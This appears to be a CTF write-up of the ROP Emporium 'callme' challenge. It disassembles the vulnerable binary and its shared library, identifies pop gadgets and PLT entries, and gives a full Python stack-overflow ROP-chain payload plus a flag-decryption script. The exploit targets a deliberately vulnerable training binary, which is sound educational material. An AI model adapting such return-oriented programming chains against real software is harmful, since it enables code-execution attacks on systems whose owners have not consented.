---
title: 03_callme
categories: [series, rop_emporium]
---

# ROP Emporium callme

* **Tools:** IDA Free 7.0, gdb-gef, checksec
* **Prerequistes:** Stack frame
* **Download solution:** [main.py](/assets/series/rop_emporium/main.py)

## Overview

> "[...] You must call callme_one(), callme_two() and callme_three() in that order, each with the arguments 1,2,3 e.g. callme_one(1,2,3) to print the flag. [...]"

There it is, in this challenge we'll have to build a chain that doesn't provoke a segfault. The archive contains the following files:
* **callme**: Binary to exploit;
* **libcallme.so**: Shared library exporting the functions `callme_one()`, `callme_two()`, and `callme_tree()`;
* **encrypted_flag.txt**: The encypted flag (bummer!);
* **key1.dat**: Part n°1 of the decryption key;
* **key2.dat**: Part n°2 of the decryption key.

## Function pwnme():

The function to pwn is similar to the previous challenges, the only difference is `_fgets()` accepts a longer input (256 bytes):
```
0000000000401A3C    mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
0000000000401A43    lea     rax, [rbp+s]
0000000000401A47    mov     esi, 256        ; n
0000000000401A4C    mov     rdi, rax        ; s
0000000000401A4F    call    _fgets
```

## Functions callme\_one(), callme\_two(), and callme\_three():

These functions are exported by the dynamic library `libcallme.so`:
```bash
readelf --syms libcallme.so | grep callme
17: 00000000000009d4   214 FUNC    GLOBAL DEFAULT   12 callme_two
21: 0000000000000aaa   246 FUNC    GLOBAL DEFAULT   12 callme_three
22: 00000000000008f0   228 FUNC    GLOBAL DEFAULT   12 callme_one
[...]
```

### Function callme\_one():

It starts by checking the content of registers `edi`, `esi`, and `edx`:

```
00000000000008F8    mov     [rbp+arg1], edi
00000000000008FB    mov     [rbp+arg2], esi
00000000000008FE    mov     [rbp+arg3], edx
0000000000000901    cmp     [rbp+arg1], 1
0000000000000905    jnz     badboy
000000000000090B    cmp     [rbp+arg2], 2
000000000000090F    jnz     badboy
0000000000000915    cmp     [rbp+arg3], 3
0000000000000919    jnz     badboy
```
Hence, it expects the follwing parameters when called:
* `edi` = 1
* `esi` = 2
* `edx` = 3

If inputs parameters are correct, the function opens the file `encrypted_flag.txt` and set its content into a global buffer:
```
0000000000000927    lea     rsi, modes      ; "r"
000000000000092E    lea     rdi, filename   ; "encrypted_flag.txt"
0000000000000935    call    _fopen
000000000000093A    mov     [rbp+stream], rax
[...]
000000000000098E    mov     rax, cs:encrypted_flag
0000000000000995    mov     rdx, [rbp+stream] ; stream
0000000000000999    mov     esi, 21h        ; n
000000000000099E    mov     rdi, rax        ; s
00000000000009A1    call    _fgets
00000000000009A6    mov     cs:encrypted_flag, rax
```

### Function callme\_two():

This function also checks that `edi`, `esi`, and `edx` are respectively set to `1`, `2`, and `3` (code not shown). If input parameters are correct, the function uses the content of the file `key1.dat` to decrypt the first 16 bytes of the flag:
```
0000000000000A4F decrypt_next:
0000000000000A4F    mov     rax, [rbp+stream]
0000000000000A53    mov     rdi, rax        ; content of key1.dat
0000000000000A56    call    _fgetc          ; get next
0000000000000A5B    mov     esi, eax        ; key
0000000000000A5D    mov     rdx, cs:encrypted_flag
0000000000000A64    mov     eax, [rbp+i]
0000000000000A67    cdqe                    ; dword to qword
0000000000000A69    add     rax, rdx        ; ->encrypted[i]
0000000000000A6C    mov     rcx, cs:encrypted_flag
0000000000000A73    mov     edx, [rbp+i]
0000000000000A76    movsxd  rdx, edx
0000000000000A79    add     rdx, rcx        ; ->encrypted[i]
0000000000000A7C    movzx   edx, byte ptr [rdx] ; encrypted char
0000000000000A7F    mov     ecx, esi        ; key
0000000000000A81    xor     edx, ecx        ; encrypted[i] xor key[i]
0000000000000A83    mov     [rax], dl       ; decrypted[i]
0000000000000A85    add     [rbp+i], 1
0000000000000A89 loc_A89:
0000000000000A89    cmp     [rbp+i], 0Fh
0000000000000A8D    jle     short decrypt_next
```

### Function callme\_three():

Again, `edi`, `esi`, and `edx` have to be set to `1`, `2`, and `3`, respectively (code not shown). Then, it uses the content of the file `key2.dat` to decrypt the next 16 bytes of the flag. The decryption follows the same algorithm as in the previous section, so code is not shown. You can have a look an my [reimplementation in Python](#decryption).

## Function usefulGadgets():

Back to the main binary. Function `usefulGadgets()` is indeed really useful, because it pops everything we need from the stack to the registers we want:
```
0000000000401AB0 usefulGadgets:
0000000000401AB0    pop     rdi
0000000000401AB1    pop     rsi
0000000000401AB2    pop     rdx
0000000000401AB3    retn
```
So, if we were to call the function `usefulGadgets()` with the following stack frame, we could successfully call and execute the function `callme_one()`:
```
0x0000000000000001
0x0000000000000002
0x0000000000000003
addr _callme_one()
```
Successfull calls to `callme_two()` and `callme_three()` would follow the same idea.

## Function usefulFunction():

We're still inside the main binary. We can't directly call the function `usefulFunction()`, because (i) it doesn't perform the calls to `callme_xxx()` in the correct order, and (ii) it sets the wrong values into `edi`, `esi`, and `edx`:
```
0000000000401A57 usefulFunction  proc near
0000000000401A57    push    rbp
0000000000401A58    mov     rbp, rsp
0000000000401A5B    mov     edx, 6
0000000000401A60    mov     esi, 5
0000000000401A65    mov     edi, 4
0000000000401A6A    call    _callme_three
0000000000401A6F    mov     edx, 6
0000000000401A74    mov     esi, 5
0000000000401A79    mov     edi, 4
0000000000401A7E    call    _callme_two
0000000000401A83    mov     edx, 6
0000000000401A88    mov     esi, 5
0000000000401A8D    mov     edi, 4
0000000000401A92    call    _callme_one
0000000000401A97    mov     edi, 1          ; status
0000000000401A9C    call    _exit
0000000000401A9C usefulFunction  endp
```
It may be tempting to build an exploit executing code at addresses `0x0401A92`, `0x0401A7E`, and `0x0401A6A`. However, doing this will just make us to lose the control we have over `rip`. Indeed, if the instruction at `0x0401A92` is executed, the return address `0x0401A97` will be set automatically on the stack. And game over for us. Instead, we will use the addresses of `_callme\_xxx()` functions from the `procedure linkage table`:
```
.plt:0000000000401810 _callme_three   proc near
.plt:0000000000401810    jmp     cs:off_602028 ; got.plt callme_three
.plt:0000000000401810 _callme_three   endp
[...]
.plt:0000000000401850 _callme_one     proc near
.plt:0000000000401850    jmp     cs:off_602048 ; got.plt callme_one
.plt:0000000000401850 _callme_one     endp
[...]
.plt:0000000000401870 _callme_two     proc near
.plt:0000000000401870    jmp     cs:off_602058 ; got.plt callme_two
.plt:0000000000401870 _callme_two     endp
```
That will do the job.

## Chaining things

Payload in Python:
```python
payload = b''
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # RBP
payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_one()
payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_one()
payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_one()
payload += b'\x50\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_one()
payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_two()
payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_two()
payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_two()
payload += b'\x70\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_two()
payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_three()
payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_three()
payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_three()
payload += b'\x10\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_three()
payload += b'\x97\x1A\x40\x00\x00\x00\x00\x00'  # proper exit
```

## Bonus: decryption {#decryption}

```python
# content of the file "encrypted_flag.txt"
encrypted_flag = b'\x53\x4d\x53\x41\x7e\x67\x58\x78\x65\x6b\x68\x69\x65\x61\x63\x74'
encrypted_flag += b'\x74\x60\x4c\x27\x27\x74\x6e\x6c\x7c\x45\x7d\x70\x7c\x79\x3e\x5d'
encrypted_flag += b'\x21\x0a'

# key1.dat and key2.dat contains 0x01 -> 0x10 and 0x11 -> 0x20, respectively. Thus:
key = 1
decrypted = ''
for c in encrypted_flag:
    if key <= 0x20:
        decrypted += chr(c^key)
        key += 1

print(decrypted)
```
---
EOF
